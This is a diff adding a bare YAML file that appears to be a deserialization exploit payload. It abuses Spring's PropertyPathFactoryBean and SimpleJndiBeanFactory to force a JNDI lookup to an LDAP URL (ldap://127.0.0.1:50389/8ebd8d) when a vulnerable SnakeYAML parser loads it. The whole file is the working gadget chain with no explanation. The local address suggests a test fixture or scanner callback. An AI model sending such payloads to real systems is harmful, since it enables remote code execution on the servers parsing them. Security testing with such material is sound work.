@@ -1,0 +1,5 @@
+!!org.springframework.beans.factory.config.PropertyPathFactoryBean
+targetBeanName: ldap://127.0.0.1:50389/8ebd8d
+propertyPath: xxx
+beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory
+  shareableResources: ["ldap://127.0.0.1:50389/8ebd8d"]
